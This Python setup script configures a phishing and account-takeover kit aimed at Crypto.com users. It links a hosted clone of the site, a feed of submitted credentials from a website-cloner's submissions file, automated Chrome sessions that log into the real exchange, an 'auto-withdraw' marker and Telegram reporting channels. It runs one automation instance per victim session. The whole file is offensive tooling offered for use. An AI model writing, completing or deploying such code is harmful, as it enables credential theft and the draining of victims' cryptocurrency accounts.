#!/usr/bin/env python3
"""
Crypto.com Automation - First Time Setup & Multi-User Support
Run once to configure everything.
"""

import os, sys, json, uuid, shutil

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")

def ask(text, default=""):
    val = input(f"  {text}" + (f" [{default}]" if default else "") + ": ").strip()
    return val if val else default

def setup():
    print("\n" + "=" * 60)
    print("  Crypto.com Exchange Automation — Setup Wizard")
    print("=" * 60 + "\n")

    # Load existing
    cfg = {}
    if os.path.exists(CONFIG_FILE):
        cfg = json.load(open(CONFIG_FILE, "r", encoding="utf-8"))
        print("  ⚠ Found existing config. Press Enter to keep values.\n")

    # Telegram
    print("── Telegram Bot ──")
    cfg["bot_token"] = ask("Bot token (from @BotFather)", cfg.get("bot_token",""))
    cfg["log_chat_id"] = ask("Log channel/chat ID (-100...)", cfg.get("log_chat_id",""))
    cfg["report_chat_id"] = ask("Report channel/chat ID", cfg.get("report_chat_id","") or cfg.get("log_chat_id",""))
    cfg["allowed_chat_ids"] = [cfg.get("report_chat_id","")]
    print()

    # Site URL + Connectivity Test
    print("── Hosting ──")
    print("  Enter your domain URL where the clone site is hosted.")
    print("  This is the SAME computer, so localhost also works.")
    print("  Examples: http://localhost:3000 | https://mysite.com")
    current = cfg.get("site_base_url", "http://localhost:3000")
    
    while True:
        url = ask("Clone site URL", current).rstrip("/")
        if not url:
            url = current
        print(f"  Testing connection to {url}/api/step ...")
        try:
            import urllib.request
            resp = urllib.request.urlopen(url + "/api/step", timeout=5)
            data = json.loads(resp.read())
            print(f"  \u2705 Connected! Step: {data.get('step', 'unknown')}")
            cfg["site_base_url"] = url
            break
        except Exception as e:
            print(f"  \u274C Connection failed: {e}")
            retry = input("  Try again? [Y/n]: ").strip().lower()
            if retry == "n":
                print("  Using URL: " + url)
                cfg["site_base_url"] = url
                break
    print()

    # Browser
    print("── Browser ──")
    cfg["headful"] = True
    cfg["use_system_chrome"] = True
    cfg["cdp_port"] = int(ask("CDP port", str(cfg.get("cdp_port", 9222))))
    cfg["browser_profile_dir"] = ask("Browser profile dir", cfg.get("browser_profile_dir", os.path.join(BASE_DIR, "browser-profile")))
    cfg["proxy"] = ask("Proxy (leave empty for none)", cfg.get("proxy",""))
    print()

    # Login URLs
    cfg["exchange_login_url"] = cfg.get("exchange_login_url", "https://accounts.crypto.com")
    cfg["api_keys_page_url"] = cfg.get("api_keys_page_url", "https://web.crypto.com")
    cfg["done_marker_path"] = cfg.get("done_marker_path", os.path.join(os.path.dirname(BASE_DIR), "passkey-vault", "auto-withdraw.done"))
    cfg["credential_feed_path"] = os.path.join(os.path.dirname(BASE_DIR), "ai-website-cloner-template", "data", "submissions.jsonl")
    cfg["keep_open_timeout_s"] = 3600
    cfg["listener_port"] = 8765
    cfg["bind_ip"] = "auto"
    cfg["credential_source"] = "both"
    cfg["telegram_long_poll_seconds"] = 30
    cfg["default_timeout_ms"] = 15000

    # Multi-user: session support
    cfg["multi_user"] = True

    # Save
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)
    print()
    print("=" * 60)
    print("  ✅ Config saved to config.json")
    print("=" * 60)

    # Also generate session server settings
    session_config = {
        "site_url": cfg["site_base_url"],
        "cdp_port": cfg["cdp_port"],
        "profile_dir": cfg["browser_profile_dir"],
        "bot_token": cfg["bot_token"],
        "log_chat": cfg["log_chat_id"],
        "report_chat": cfg["report_chat_id"],
    }
    session_dir = os.path.join(BASE_DIR, "sessions")
    os.makedirs(session_dir, exist_ok=True)
    with open(os.path.join(session_dir, "config.json"), "w", encoding="utf-8") as f:
        json.dump(session_config, f, indent=2)

    # Create session manager
    print("""
  Multi-User Mode: Each login session gets a unique ID.
  Your clone site should send ?session=ID in API calls.
  Python spawns one automation instance per active session.

  To start: python session_server.py
  """)

if __name__ == "__main__":
    setup()
